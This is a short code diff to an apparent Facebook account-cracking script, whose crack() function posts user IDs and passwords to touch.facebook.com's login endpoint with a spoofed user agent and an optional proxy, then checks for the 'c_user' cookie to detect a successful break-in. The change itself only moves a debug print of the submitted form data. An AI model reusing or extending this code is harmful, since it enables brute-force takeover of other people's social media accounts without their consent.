@@ -146,6 +146,7 @@ def crack(uid, pww, total_idz):
             '__fmt': '0',
             '__a': '',
             '__user': '0'}
+            print(data)
             headers = {
             'authority': 'touch.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -165,7 +166,7 @@ def crack(uid, pww, total_idz):
             'user-agent': useragent_facebook(),
             'viewport-width': '980',}
             response = session.post('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
-            print(data)
+            #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
